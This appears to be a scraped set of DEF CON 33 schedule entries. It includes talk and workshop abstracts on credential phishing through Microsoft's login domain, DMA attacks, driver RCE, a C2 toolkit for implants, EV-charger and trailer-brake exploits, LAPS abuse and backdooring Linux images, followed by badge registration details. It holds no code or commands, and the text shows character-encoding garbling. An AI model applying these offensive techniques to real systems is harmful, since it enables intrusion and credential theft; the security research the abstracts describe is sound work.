<li><p>Generate security assessments for resources tagged to specific applications</p></li>
<li><p>Uncover hidden attack paths by analyzing IAM permission chains</p></li>
</ol>

<p>The tool is open-source and available today - you can start using it immediately after the talk to gain deeper insights into your own AWS environments</p>

<p>Cryptocurrency nodes validate and relay transactions across the network. Like servers in a traditional financial system, nodes store a copy of the blockchain and enforce the network's rules. Many of us want to run their own node for reasons of security, convenience, and independence of other people's node configurations. Come to understand nodes, build your own, and explore configurations to test wallet applications on your new cryptocurrency node.</p>

<p>Microsoft Entra ID â one of the most used identity providers in the enterprise market. Or from our perspective: the most targeted platform in phishing attacks.
Getting our phishing infrastructure up and running is usually the easy part. The real challenge is often keeping it online long enough to deliver the phishing link and collect credentials without detection before it gets burned.</p>

<p>But what if we could use Microsoft's official login domain for our phishing purposes? And no, I'm not talking about the heavily mitigated OAuth Consent or Device Code Phishing techniques, or simply hosting a phishing page on Azure Web App subdomains. I'm talking about stealing credentials directly from the legitimate login.microsoftonline.com domain.</p>

<p>In this talk, I will share multiple novel methods that can be used to achieve this. And the best of all? It all relies on legitimate functionality, making it mostly unpatchable. ð</p>

<p>DMA vulnerabilities aren't new - but they don't seem to have gone anywhere. In the time software attacks have gone from a single bug to a multi-stage exploit chain, DMA attacks have gone from slipping some hardware into an internal slot of a computer to... plugging in an external device?</p>

<p>Despite decades of attacks, tooling, and even mitigations, most systems are still wide open to these attacks because of their perceived difficulty, poor system configuration, and lack of effective testing mechanisms.</p>

<p>Epic Erebus is a new tool that tries to address these issues. It's small, portable, and easy to use. It can slip through most systems unless the hardware, bios, and operating system are properly configured (a rarity). Finally, it's an entirely open PCIe implementation that gives you full control over Transaction Layer Packets - allowing you to reverse engineer the PCIe Bus and the DMA mitigations in place (Get it? RE-Bus... Erebus!)</p>

<p>You should come away understanding what erebus is capable of, the basics of how to use it, and what to look out for when properly implementing DMA attack mitigations.</p>

<p>Modern software protectors increasingly rely on complex, often nested, virtualization techniques (VMProtect, Themida, custom solutions) which significantly hinder static and dynamic analysis. This talk introduces DragonSlayer, an automated framework combining symbolic execution with fine-grained dynamic taint tracking to systematically lift obfuscated bytecode from these protectors. Our approach precisely identifies VM handlers, recovers original instruction semantics, automatically unpacks multiple virtualization layers, and reconstructs analyzable representations of protected code. We demonstrate DragonSlayer's effectiveness against the latest commercial VM protectors and custom obfuscation solutions, significantly reducing analysis time from weeks to hours. This presentation includes technical deep-dives into our methodology, real-world case studies, and a demonstration of our tooling that helps reverse engineers slay the virtualization dragon.</p>

<p>Bloatware. We all hate it, and most of us are good at avoiding it. But some vendor tools â especially those managing critical drivers â can be useful when the Windows Update versions arenât good enough for performance-critical computing.</p>

<p>What started as a routine driver update took a sharp turn when I confirmed a reboot modalâ¦ from my browser. Wait, my browser shouldnât be able to do that!? To my disappointment (and maybe some surprise), it turned out to be arbitrary code execution â right from the browser. This kicked off a week-long deep dive, uncovering seven CVEs in seven days across several prominent vendors, all exploiting a common pattern: privileged services managing software on Windows with little regard for security.</p>

<p>In this talk, Iâll walk through the journey of discovery and exploitation of several vulnerabilities that lead to LPE/RCE. I'll cover everything from the initial attack surface discovery, reverse engineering and finally exploitation of several vulnerabilities. By the end, participants will probably be uninstalling similar software mid-session. While the exploitation journey is fun and impactful, this isnât the kind of âaccess everywhereâ anyone wants. Itâs 2025 â we have everything we need to do better.</p>

<p>In March, former national security advisor Mike Waltz accidentally invited a journalist into his war crimes Signal group with other senior Trump officials. âWe are currently clean on OPSEC,â secretary of defense Pete Hegseth posted to the group. In May, Waltz was photographed clandestinely checking his Signal messages under the table during a cabinet meeting.</p>

<p>Only it turns out, Waltz was actually using a knock-off of Signal called TM SGNL. Immediately after that, TeleMessage (the company that makes TM SNGL) was hacked, and the hacker was able to access plaintext Signal messages. It was then hacked again, and the second hacker exfiltrated hundreds of gigabytes of data before TeleMessage took its service offline.</p>

<p>This talk is about the entire Signalgate saga: the journalist getting invited to the Signal group; Trump officials lying to Congress; the history of TeleMessage, which was founded by a former Israeli spook; an analysis of the TM SGNL source code that proves the company lied about supporting end-to-end encryption; the trivial exploit that was used to extract data from TeleMessageâs archive server; and an analysis of hundreds of gigabytes of memory dumps full of chat logs from TeleMessage customers.</p>

LetâÃÃ´s stop doing that. LetâÃÃ´s share the fun! C4 (Cross-Compatible Command &amp; Control) is here to change that. ItâÃÃ´s a modular toolkit of WASM-powered plugins that makes external C2 easy to implement, regardless of your implant's language or target OS. Whether youâÃÃ´re writing in C, Rust, Go, Python, C#, or something else entirely, C4 plugins can be loaded directly into your implant and run on Windows, macOS, or Linux. But the real game-changer? C4 provides a single, centralized collection of over 10 fully-documented, operationally-ready external C2 modules âÃÃ® not just proof-of-concepts, but production-level integrations with trusted sites that fly under the radar. No more hunting through GitHub repos, hand-rolling fragile API calls, or hacking together glue code for every new environment. Stop reinventing external C2 and start planting some C4 in your implants!</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>The rapid growth of cyber threats has made endpoint logging a critical component of modern security operations. Defenders increasingly rely on endpoint telemetry like Sysmon logs to detect and investigate breaches. These logs capture crucial forensic evidence, but the sheer volume and complexity of Sysmon logs often overwhelm analysts and hinder timely and effective analysis. Garuda is an open-source PowerShell framework designed to address this challenge by providing a unified, flexible, and efficient approach to endpoint detection and response using Sysmon events. With advanced filtering capabilities, cross-event correlation, multiple contextual views, precise time-based noise reduction, and support for both remote and offline (EVTX) analysis, Garuda enables security teams to quickly uncover attack chains, investigate incidents, develop detection logic, and perform in-depth malware analysis all within a single, scriptable environment. Its extensible nature allows one to use it for various scenarios, including threat hunting, investigation, anomaly detection, detection engineering, and malware analysis. Garuda can accelerate investigations, improve detection, and provide deep visibility into endpoint activity.</p>

<p>Maritime vessel controls and operational technology (OT) systems are getting more complex and interconnected. With industry trends aiming to reduce crew, automate tasks, and improve efficiency, these networks are expanding in scale, intricacy, and criticality for vessel operation and maintenance. The standard controller area network (CAN) bus for maritime vessel networks, developed by the National Marine Electronics Association (NMEA), known as NMEA2000. NMEA2000 is an application layer network protocol built on the ISO11783 standard and compatible with automotive SAEJ1939, it uses unique message identifiers known as Parameter Group Number, to define the data within each communication frame. Despite its widespread use, NMEA2000 remains a relatively unexplored domain, particularly in understanding normal versus abnormal network behavior, due to the unavailability of open-source datasets. To address this gap, we constructed a NMEA2000 system consisting of five nodes: GPS/Radar, Wind Speed/Direction sensor, and Multifunction Display. Using this setup, we collected datasets to analyze system behavior and developed deterministic fingerprints for each sensor, establishing a baseline of the normal operating system. We subject the system to controlled attacks to evaluate the accuracy and effectiveness of the fingerprints. This work represents a foundational step towards enhancing security and reliability in maritime OT systems.</p>

<p>Opportunities in InfoSec are everywhere, but theyâre often buried across scattered websites, social media posts, or chat channels. Whether itâs a local meetup, a CFP deadline, a volunteer opportunity, or the chance to sponsor an initiative, many people and organizations miss out simply because they donât know where to look or find info bloated by pay-to-play noise. </p>

<p>InfoSecMap was created to solve this. Itâs a free, community-driven platform that brings the global InfoSec ecosystem together in one place. From major conferences to CTFs and grassroots meetups, InfoSecMap helps users explore whatâs happening by geographic region or focus area and discover where they can connect and contribute.</p>

<p>InfoSecMap is proud to partner with OWASP, bringing together volunteer-led chapters and global events while fostering stronger connections and community growth. We believe open source should mean open access, and weâre building the infrastructure to make that real.</p>

<p>At DEF CON 24, an SSH honeypot on the open network held a puzzle that would go on to inspire the first Walkthrough Workshop. Although the Walkthrough Workshops at the Packet Hacking Village no longer feature Cowrie, its echoes live on at DEF CON. Out of the box, Cowrie is a medium-interaction SSH honeypot, but this level of interaction can be raised with a little elbow grease. From custom commands and adventure games to file systems laid out as spatial cubes, this talk explores several years of Cowrie-based challenges that will bash your expectations of terminal interaction.</p>

<p>Back in 2020 the Brazilian Central Bank launched PIX, a real time wire transfer and payment protocol that has been adopted by the Brazilian population, and nowadays PIX represents the most used payment method in the country. However, local cybercriminals quickly adapted and leveraged PIX for malicious activity. Since then, criminal activity in Brazil has ramped, from kidnapping, stealing of mobile phones, to money laundering ""on steroids"" and targeted banking trojans. Instant wire transfers made fraudulent transactions run faster than the speed of light, and were almost impossible to stop and to recover the stolen funds. A criminals' paradise. In this presentation we will discuss the fraud schemes that were fueled by PIX and the ones that emerged since then, haunting the local population.</p>

<p>The phrase ânational security impacts of offensive cyber in the healthcare sectorâ typically brings to mind images of destructive, obvious attacks on hospitals. It should also bring to mind the covert theft of vast troves of biological data. The PRC has a well established policy of stealing intellectual property as a path to development using tactics which have come, in recent years, to prominently feature hacking. The theft of US and allied biological data is crucial to our personal privacy, civil liberties, and national security and we must understand what data is most likely to be targeted in order to best defend it. In sectors other than biotechnology, PRC state-sponsored hacking often focuses on areas identified for development in major planning documents and areas to which the PRC party-state is already devoting significant financial resources to research. For this reason, it is useful to understand the intersection of PRC targeted areas for growth and development and areas in which stealing US sources of data is the easiest and most easily applicable to emerging biotechnology sectors. This talk identifies those sectors and discusses potential consequences.</p>

<p>Quantum computers will crack RSA and ECC and weaken symmetric encryption, but when? NIST is betting it won't happen before 2035, setting that deadline for companies to migrate to post-quantum cryptography (PQC). However, recent developments make it clear that we might not have 10 years; we might have only 5! Join Konstantinos Karagiannis (KonstantHacker) as he breaks down the latest algorithmic estimates, including Oded Regev's game-changing tweak to Shor's algorithm, which promises faster factoring with fewer qubits. He also discusses IonQ and IBM's aggressive roadmaps, pushing us closer to cryptographically relevant quantum computers (CRQCs). Think 1000+ qubits by 2026 and fault-tolerant systems by 2030. And when Q-Day does arrive, will we be able to catch or prevent bad actors from running these algorithms on cloud quantum platforms?

<p>HUMINT is one of the most powerful, yet least understood tools in cyber threat intelligence. This talk will walk through the full lifecycle of a deep cover HUMINT operationâfrom identifying high-value sources, to crafting believable personas, navigating forum dynamics, and extracting intelligence through direct engagement with threat actors. Weâll explore how these operations provide early warning of attacks, insights into actor motivations, and access to tools before theyâre deployed. But going undercover isnât without risk. Weâll cover the technical and psychological challenges, OPSEC fundamentals, and ethical dilemmas that define this high-stakes work. Attendees will learn how to map underground communities, build credibility, and collect actionable intelligence without blowing cover. With real-world examples and field-tested strategies, this session offers a rare look inside the human side of CTIâwhere trust, deception, and tradecraft matter more than tooling. For anyone serious about adversary engagement, this is where the automation endsâand infiltration begins.</p>

<p>For those who find it hard to dive into something new alone, we will be offering small tour groups to take people around to various villages, contests and communities. We will meet in the LVCC West Hall - South Entrance, look for the butterfly logo banner! We will then leave for the village/contest/event/community as a group, hang out there for 15 minutes or so, and then you may choose to return to the lobby with the group or stay in the village. We are NOT members of where we are going to tour, we are all finding out about the cool things at DEF CON together.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>End-to-End-Verifiability (E2E-V) is a cryptographic paradigm that, as applied to voting systems, allows voters to independently verify that their votes were cast as intended, guaranteeing that votes were recorded as cast, and tallied as recorded. As such, it is being promoted to public officers and elected officials at the county and state levels as the âmagic bulletâ allowing for secure voting over the internet. This talk will argue, in a relatively low-tech way, that E2E-V is irrelevant to some attacks â both to servers outside the cryptographic âloop,â and particularly to client-side systems. E2E-V-equipped voting systems are primarily vulnerable to client-side malware, which would still be free to alter or sabotage voting applications and devices. The talk will present opinions from technical experts on E2E-V. These perspectives are juxtaposed against opinions and rhetoric from the commercial promoters of internet voting systems.</p>

<p>Ever wondered what happens after you hit ""submit"" on a bug bounty report? At T-Mobile, each submission kicks off a behind-the-scenes journey that spans teams, tools, and time zones. In this talk, weâll walk through the lifecycle of a bug bounty submissionâfrom Bugcrowdâs triage desk to our internal security workflowsâand show why not every finding is considered equal from a business risk perspective.</p>

<p>We'll demystify our internal process: how we prioritize, validate, assign ownership, and resolve reports. You'll see what makes a report fast-tracked to payoutâand what gets politely declined. Backed by stats, weâll reveal how many submissions we get, how many are duplicates or out of scope, and how we determine true impact.</p>

<p>Expect real war stories: from late-night calls and team escalations to reports that sent us scrambling. We'll also lighten the mood with a few âcreativeâ submissions that didnât quite hit the mark.</p>

<p>Most importantly, weâll share submission tips drawn from common pain pointsâwhat helps us help you, and how high-quality reports earn faster turnarounds, higher payouts, and opportunities like private programs, CVEs, and Bug Bashes.</p>

<p>Whether you're a seasoned hunter or just starting out, this session will give you an honest, inside look at how BBPs work from our endâand how you can maximize your success.</p>

<p>In this talk we present a collection of attacks against the most widely used EV charging protocol, by exploiting flaws in the underlying power-line communication technologies affecting almost all EVs and chargers.</p>

<p>Specifically, we target the QCA 7000 Homeplug modem series, used by the two most popular EV charging systems, CCS and NACS.</p>

<p>We demonstrate multiple new vulnerabilities in the modems, enabling persistent denial of service.</p>

<p>To better understand the scope of these issues, we conduct a study of EV chargers and vehicles, and show widespread insecurities in existing deployments.</p>

<p>We show a variety of practical real-world scenarios where the HomePlug link can be used to hijack EV charging communications, even at a distance.</p>

<p>Finally, we present results from reverse engineering the firmware and how we can gain code execution.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Tanker trailers? Turns out those aren't just big, dumb hunks of metal. They have a powerline network, PLC4TRUCKS, which is unintentionally accessible wirelessly (CVEs 2020-14514 and 2022-26131). We found new trailer brake controllers using diagnostic protocol KWP2000, secured with access control by seed-key (a challenge-response protocol). We'll show how to use Wireshark to analyze the diag. traffic. We'll discuss why randomness is critical for any challenge-response protocol.</p>

<p>We'll cover two ways to bypass this access control: using a SMT solver to crack the routine from a few request-response pairs (automated with AHK), and a classic reset attack that makes seeds entirely predictable. This second way allows for a blind, wireless attack, a finding now recognized as CVE-2024-12054. We'll detail how we ran timing search 'campaigns' with a custom sigrok decoder to PoC it.</p>

<p>The trailer brake controller is also at risk from trailer-installed telematics devices too. We'll show how to use Scapy Automotive's UDS scanner on a faked CAN bus for PLC4TRUCKS (plus modify that for a known seed-key routine) so we can get a picture of that attack surface.</p>

<p>This and the previous CVEs are a result of the heavy vehicle testing we do. We'll share some details of how we do onsite truck tests and how we do bench tests.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>This research examines security oversights in a range of modern 4G/5G routers used in small businesses, industrial IoT, and everyday mobile deployments. Several of these routers contain vulnerabilities reminiscent of older security flaws, such as weak default credentials, inadequate authentication checks, and command injection pathways. By reverse-engineering firmware and testing for insecure endpoints, it was possible to demonstrate remote code execution, arbitrary SMS sending, and other serious exploits affecting Tuoshi and KuWFi devices.</p>

<p>Through practical examples, including Burp Suite requests and Ghidra disassembly, the talk highlights how these weaknesses can grant attackers root access, allow fraudulent activity, or compromise entire networks. In each case, mitigation strategies and best practicesâlike robust authentication, regular firmware updates, and network segmentationâare emphasized. Ultimately, this presentation underscores the importance of continuous security scrutiny, even for modern hardware, and encourages the community to stay vigilant and collaborate in uncovering and addressing such pervasive vulnerabilities.</p>

<p>Voice cloning technology has advanced significantly, enabling the creation of convincing voice replicas using consumer-grade devices and publicly available tools. This poses critical challenges to aviation communication, where trust between pilots and air traffic controllers is paramount. The reliance on AM radio, with its low fidelity and lack of authentication, exacerbates the risk of fraudulent communications. This talk examines trust factors within aviation's air traffic control system, focusing on how air traffic controllers' voices can be cloned and where planes are most at risk. The talk explores FCC enforcement techniques for locating malicious actors, historical perspectives on alternative radio technologies, and the secondary systems pilots employ during communication failures. Simulated attacks will demonstrate how these vulnerabilities could disrupt operations, particularly at critical points such as runway crossings and in low-visibility conditions. </p>

<p>To mitigate these risks, this talk evaluates existing safeguards, including the Traffic Collision Avoidance System (TCAS), and discusses emerging technologies such as stop bars and guided runway lighting.</p>

<p>Local Administrator Password Solution (LAPS) automates local admin password rotation and secure storage in Active Directory (AD) or Microsoft Entra ID. It ensures that each system has a unique and strong password.</p>

<p>In OverLAPS: Overriding LAPS Logic, we will revisit and extend our previous research (Malicious use of ""Local Administrator Password Solution"", Hack.lu 2017) by exposing client-side attacks in Windows LAPS (""LAPSv2""). After a brief overview of LAPS's evolution, from clear-text fields in AD with Microsoft LAPS (""LAPSv1"") to encrypted AD attributes or Entra ID storage with Windows LAPS, we will explore the client-side logic of Windows LAPS. Unlike prior work that exfiltrates passwords only after directory compromise, we will focus on abusing LAPS to maintain presence on compromised endpoints, both on-prem and Entra-joined devices.</p>

<p>We will leverage PDB symbols and light static analysis to understand how LAPS works internally, then use Frida for dynamic hooking to capture, manipulate, and rotate admin passwords on demand. We will also reproduce Frida proof-of-concepts using Microsoft Detours for in-process hooks.</p>

<p>Attendees will gain practical insights into new attack vectors against Windows LAPS, enabling them to assess, reproduce, and defend against client-side attacks in their own environments.</p>

<p>Antoine Goichot is a French cybersecurity professional and Ethical Hacker working in Luxembourg. With ten years of hands-on experience and some certifications (CRTO/CRTL, GPEN/GXPN, GDAT), he has been into hacking since junior high school. He was always trying to find clever ways to solve technical problems and tweak his computer. In high school, he jailbroke a dozen PSPs so friends could play homebrew games between classes. He later studied computer science and networks at TELECOM Nancy.
Now as Senior Manager at PwC Luxembourg, Antoine leads projects for a large variety of clients including major corporations, banks, European institutions, and insurance companies. Beyond his day job, he has uncovered several vulnerabilities in Windows VPN clients, Cisco AnyConnect (CVE-2020-3433/3434/3435, CVE-2020-27123, CVE-2021-1427) and Ivanti Secure Access (CVE-2023-38042). These issues have been fixed by vendors after coordinated disclosure.
Antoine has contributed to the cybersecurity community through a conference paper co-authored during his studies, blog posts, articles in the MISC magazine (French periodical), etc. He also co-presented at Hack.lu in October 2017 on ""Malicious use of 'Local Administrator Password Solution'""</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>The Commodore 64 home computer, which sold at least 12.5 million units from 1982 to 1994, was widely used during a formative early decade in the subcultures of hacking, phreaking, piracy, and cybercrime. Like ancient insects trapped in amber, discovered and studied millions of years later, ephemera of hacker history has been fortuitously preserved in the file system structures of C64 floppy disks from the 1980s and 90s. </p>

<p>Enthusiasts and researchers have created byte-for-byte copies of disks in order to preserve games, applications, and demos of the time period. What is less obvious, however, is that users of the time tended to reuse disks, deleting old files to make space for new programs. This and other use patterns have resulted in interesting data being retained in unallocated sectors alongside the overtly-accessible programs and data. Often, this data can be recovered and includes logs of online sessions, hacker text files, and more.</p>

<p>In this talk, Dr. McGrew describes software and workflow he developed to perform forensic processing and full-text indexing of over 650,000 unique C64 floppy disk images from publicly-accessible online archives. He will also present interesting findings from searches and analysis that illustrate, for the modern audience, day-to-day hacker communications and tools of the past.</p>

<p>Remember that soul-crushing moment when you opened an 8.9 GB of burp suite file? Yeah, fun times. But hereâs something even more annoying: reading a random blog post where someone casually mentions a $5,000 bugâan unauthenticated admin panel hidden on some obscure, unpredictable URL of a well known target.<em>x000D</em>
<em>x000D</em>
I feel you, itâs hard to deal with huge attack surfaces, endless URLs and thousands of subdomains. And itâs even harder to expand your attack surface to find pages that no one ever looked at it before. Donât get me wrongâI still think AI sucks at pentesting (sue me). It wonât chain exploits, think creatively, or outsmart a well-configured WAF. But here we are. Itâs really good at generating path/subdomains, and picking out the most important targets from a massive list. And lastly, AI can be a smart assistant that is specifically configured for the target appâs test. It handles the boring stuff, so you can focus on breaking things.<em>x000D</em>
<em>x000D</em>
In this talk, weâre not glorifying AIâweâre putting it to work. Smart, sharp, and right where it counts.</p>

<p>For those who find it hard to dive into something new alone, we will be offering small tour groups to take people around to various villages, contests and communities. We will meet in the LVCC West Hall - South Entrance, look for the butterfly logo banner! We will then leave for the village/contest/event/community as a group, hang out there for 15 minutes or so, and then you may choose to return to the lobby with the group or stay in the village. We are NOT members of where we are going to tour, we are all finding out about the cool things at DEF CON together.</p>

<font size=""+1""><strong>SpeakerBio:</strong></font>&nbsp;&nbsp;Megan Allen<br>
<p>Hi, Iâm Megan Allen.</p>

<p>My work focuses on a holistic approach to health; moving the bodyâs natural energy into alignment with Earth and the seven chakras. I practice integrative wellness - honoring a person's emotional, mental, physical and spiritual well-being. I provide intuitive healing sessions and work with clients to relax the mind, increase body awareness and balance energy flow.</p>

<p>I also facilitate community wellness workshops, ceremonies and transformational group programs inviting participants to disconnect from their busy lives, turn inward and tap into the present to restore and maintain the bodyâs energetic balance and cultivate self-love, empowerment and sovereignty.</p>

<p>I inspire people to activate their highest potential in alignment with their wise hearts and to promote healing from within. I tailor my sessions to reflect this; using techniques from my healing disciplines as well as my love for Traditional Chinese Medicine, holistic aromatherapy, crystals and essential oils, tarot, animal medicine cards and a deep reverence for nature.</p>

<p>Nature is one of my greatest teachers. It constantly teaches me about grounding, stability, resilience, boundaries, growth, and stillness.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Physical security has long been a core component of voting system defenses through the use of keyed locks and tamper-evident seals/tape/stickers. With procedural protections requiring their use, arbitrary voters are explicitly permitted to physically interact with these systems in a semi-private setting (voting booth) under the assumption that the hardwareâs attack surface can be sufficiently- scoped to a set of intended, known-safe interactions (i.e. limit/prevent access to I/O interfaces, administrative controls, storage devices, etc.). Some have even cited these specific defenses as pre-existing and sufficient mitigations for vulnerabilities in already-deployed voting system such that further remediation is not needed. Unfortunately, this assumption does not hold under scrutiny. A review of publicly available sources from vendors, jurisdictions, and assorted other entities reveals substantial weaknesses in the design, configuration, and deployment of such defensive devices. In addition to recovering/matching voting system keys from depictions specific to more than half of U.S. states, their identity, ease of acquisition, and apparent default/universal configuration bodes poorly even for states without depictions sufficient to recover/match. Though less definitive, analogous concerns were found related to tamper-evident devices in design, selection, composition, and application such that reliance on their detective capabilities is uncertain at best. With near-identical issues affecting voting systems across vendors, products, and jurisdictions documented across more than a decadeâs worth of sources, the systemic failure of design, certification, and testing is readily apparent. While changes in the VVSG 2.0 standard serve as direct mprovements, they continue to leave predictable weaknesses lying in wait for future elections.</p>

<p>Drew Springall is an Assistant Professor of Computer Science at Auburn University, and is a hacker/security researcher with a focus on the technical/concrete aspects of voting system security. Since 2013, Drew has worked to understand and demonstrate the difficulty attackers would face should they attempt to attack such systems as deployed in the real-world and given realistic resources to leverage. Most recently, Drew has worked specifically on the DVSorder ballot randomization flaw and the âSecurity Analysis of Georgiaâs ImageCast X Ballot Marking Devicesâ report published along with Prof. J. Alex Halderman.</p>

Both survey questions and their answers are crowd-sourced from the Cybersecurity community. Two teams (Left Foot and Right Foot) captained by Ali Diamond and John Hammond and comprised of audience members go head to head, trying to figure out the top answers to the survey questions.</p>

<p>Attendees can either watch the game or volunteer to play on one of the two teams. Audience participation is also encouraged if either of the two teams fails to get every answer of a survey question.</p>

<p>Ultimately Feet Feud is about having a laugh, watching people in the industry attempt to figure out what randomly surveyed people from the Cybersecurity community put as answers to a number of security / tech related questions.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p><strong>Please note: This two-day training will be offered on Saturday and Sunday (August 9-10). Participants will receive a DEF CON Human Badge with their registration</strong></p>

<p>It is indeed all about the information. Information is powerâand those who control it hold the reins. This course dives deep into the topic of Influence Operations (IO), teaching you how adversaries manipulate, deceive, and control the flow of information to achieve their objectives. From destabilizing governments to swaying elections and ruining careers, IO is a tool used by state and non-state actors alike. The question is, how do you defend against it?</p>

<p>In this fast-paced, hands-on course, weâll break down how IO is planned, executed, and defended against. Youâll gain the skills and knowledge to not only recognize and counteract these operations but to protect yourself, your organization, and even your country from their impact.</p>

<p>What You'll Learn:</p>

<ul>
<li>IO Strategies &amp; Tactics: From the basics to advanced techniques, understand how influence operations shape public opinion, corporate behavior, and political landscapes.</li>
<li>Psychological Operations (PSYOP): Explore the manipulation of biases, emotions, perceptions, and actions to control outcomes.</li>
<li>Deception and Counterdeception: Learn how deception campaigns are crafted, and how to spot and disrupt them.</li>
<li>Military Doctrine &amp; TTPs: Understand military frameworks for IO and adapt them for defending against threats.</li>
<li>Incident Response &amp; Defensive Tactics: Equip yourself with practical strategies for detecting and defending against IO campaigns targeting individuals and organizations.</li>
<li>Crafting Messages &amp; Understanding Propagation: Learn the art of creating and spreading messages to achieve specific goalsâwhile also learning how to counter malicious ones.</li>
<li>Real-World Case Studies: From deceptive news to social media manipulation, analyze recent IO campaigns to understand their impact and develop defensive strategies.</li>
<li>Live IO Campaign Contest: Compete in a live âbest IO campaignâ contest, applying the techniques youâve learned during the course to test your strategies. </li>
</ul>

<p>By the end of the course, youâll not only have a deep understanding of how IO is executed, but you'll also walk away with practical tools to defend against these attacks. Youâll learn how to recognize the signs of manipulation, understand the motivations behind IO, and develop countermeasures to protect against them.</p>

<p>In a world where information is weaponized, knowing how to protect yourself is no longer optional. Whether youâre securing yourself, an organization, protecting a political campaign, or defending a nation, this course is your toolkit for navigating the complex and increasingly dangerous world of influence operations.</p>

<p>Every watt and bit tells a story.</p>

<p>The concept of ""smart grids"" dates back to the 1970s with automatic meters, but the term emerged with the Energy Independence and Security Act of 2007. Since 2012, the integration of smart grids and Cloud computing has been a topic at IEEE meetings. This raises key questions: How do we assess risks to physical and virtual infrastructure? What are the impacts of a breach? Where does digital forensics fit in?</p>

<p>Since 2017, the Cloud Forensics Workshop has introduced security professionals to core Cloud forensics concepts. The latest Smart Grid Edition explores the relationship between smart grids, Cloud computing, and digital forensics. Participants will engage in hands-on labs using open-source tools to identify indicators of compromise (IoCs), acquire forensically sound artifacts, and apply AI and automation in investigations. Registered students will download sample data before the workshop and apply their skills in a live tabletop exercise.</p>

<p>Did you ever wanted to hack an IoT device but did not know how to start? Having UART is nice, but does not help in many cases.</p>

<p>For a complete analysis of an IoT device, it is required to look at the firmware itself. In most cases this means that the firmware, data or encryption keys need to be extracted from the device memory. Many researchers are hesitant to do that as there is a high risk of destroying the device or leaving it in an inoperable state. In this workshop we will look at different flash memory types (EEPROM, SPI flash, NAND flash, eMMC flash) and how to extract the information from them.</p>

<p>We will show that you do not need very expensive hardware to archive your goal and that it is not as complicated as everyone believes. See which tools might be useful for your own lab!</p>

<p>Participants will have the opportunity to work in groups and being provided different kinds of IoT devices (e.g. smart speakers). After a tear-down, you can use different chip-off methods (e.g. Hot air, IR soldering) to remove the flash chip and read it out. Optionally, the tools re-ball and re-solder the IC will be available after the workshop. In the end, each team should have the data and a functional device again.</p>

<p>Bonus: If you brick the device, you can keep the parts as a souvenir or can wear them as badges.</p>

<p>EMMC is a common flash memory format for more complex embedded devices and the Ball Grid Array (BGA) is a popular format for EMMC modules. BGA modules can be intimidating to hardware hackers since the pins are not exposed and are instead underneath the chip. This workshop will demonstrate and allow you to practice removing EMMC modules from an inexpensive circuit board using flux and a hot air station. The module will contain a Linux operating system and a Raspberry Pi. Workshop participants will learn how to image the removed EMMC. Mount and change the Linux filesystem in order to backdoor the image and gain access, and then learn how to copy the image to a new EMMC. Participants will then learn how to attach the module to a BGA carrier board with hot air.</p>

<p>A basic understanding of soldering is all that is required to be successful in this workshop. An understanding of the Linux filesystem is also helpful, but not required. We will have step by step instructions and will also have a small prize for the participant who comes up with and demonstrates the most clever Linux backdoor on their Raspberry Pi.</p>

<p>At the end of this workshop, participants will have an understanding of:
How to remove, clean and image BGA modules
Basics of offline Linux filesystem hacking
How to image and reattach BGA EMMC modules</p>

<p>Our human registration process this year will be very similar to previous years. Please be patient. All of the times listed here are <strong>approximate</strong>. </p>

<h1 id=""basics"">Basics</h1>

<h3 id=""whoneedsabadge"">Who needs a badge?</h3>

<p>A badge is required for each human age 8 and older.</p>

<h3 id=""human"">Human?</h3>

<p>You are a human if you do not know otherwise. People that are not humans include goons, official speaker, village/community/contest/creator staff, press, black badge holders, or similar. If you are not a human, you need to register separately. If you don't know how, see an NFO goon (NFO Node, formerly known as an infobooth, is where you can get help). The remainder of this message applies only to humans.</p>

<h3 id=""lineslinecon"">Lines? Linecon?</h3>

<p>Linecon is your optional opportunity to stand (or sit) in line for human registration to open. Doors will open for linecon on Wednesday at approximately 17:00. When human registration opens on Thursday at approximately 08:00, they start working the linecon queue, and the line will start moving quickly. (Please understand that we will begin processing the line on Thursday morning as soon as the cashiers and materials are in place; we will strive for Thursday 08:00, but actual start may be slightly earlier or later.)</p>

<p>Online badge purchase (aka pre-registration) has no impact on linecon. You can join the line on Wednesday (if you wish) regardless of whether you purchased a badge online or intend to pay with cash. There is only one linecon for both types of badge sales. </p>

<p>Please help us make this a great experience for everyone by <strong>following directions given by goons</strong>. After human registration opens, there may be one line for all of registration, or there may be two lines (one for online sales (pre-registration) and one for cash sales). This may also change over time, based on available staffing and necessary crowd control. We will strive to make it easily understandable in-person as to which line you should join. </p>

<h1 id=""waystobuyabadge"">Ways to buy a badge</h1>

<ul>
<li>$560 <a href=""https://shop.defcon.org/products/def-con-33-ticket"">online purchase</a> until July 18, 2025. Tickets are transferable. Please read the details on the linked page.</li>
<li>$580 <a href=""https://shop.defcon.org/products/def-con-33-ticket"">online purchase</a> until August 1, 2025. Tickets are transferable. Please read the details on the linked page.</li>
<li>$500 cash purchase on-site.</li>
<li>As part of a BlackHat registration.</li>
</ul>

<h3 id=""onlinepurchase"">Online Purchase</h3>

<p>You will be emailed a QR code to the email address provided when you bought your badge. Please guard that QR code as though it is cash -- it can only be redeemed once, and anyone can redeem it if they have it (including a photo of it). Badges are picked-up on-site -- they will not be mailed or shipped.</p>

<p>We can scan the QR code either from your phone's display or from a printed copy. You <strong>must</strong> have the QR code with you in order to obtain your badge. As you approach the front of the line, if you are going to show your QR code on an electronic device, please ensure that your display is set to maximum brightness. </p>

<p>If you pre-registered, but ultimately are unable to attend DEF CON and want to cancel your purchase, the <strong>only</strong> way to get a refund is from the original online source. We are unable to provide any refunds on-site at DEF CON. There is a fee to have your badge canceled: $34 before July 18, and $84 on and after July 18.</p>

<p>Online purchases are provided a receipt via email when the purchase is made.</p>

<p>Online purchase -- often referred to as pre-registration -- does not allow you to skip any line/queue to pick up your badge. Once you arrive on-site, you will need to join the existing line for human registration. There may or may not be a dedicated line for pre-registration badge pickup, depending on when you arrive, how long the line is, available staff, etc.</p>

<h3 id=""cashpurchase"">Cash Purchase</h3>

<p>Badges will be available for purchase on-site at DEF CON. All badge sales are <strong>cash only</strong>. No checks, money orders, credit cards, etc., will be accepted. In order to keep the registration line moving as quickly as possible, please have <strong>exact change</strong> ready as you near the front of the line.</p>

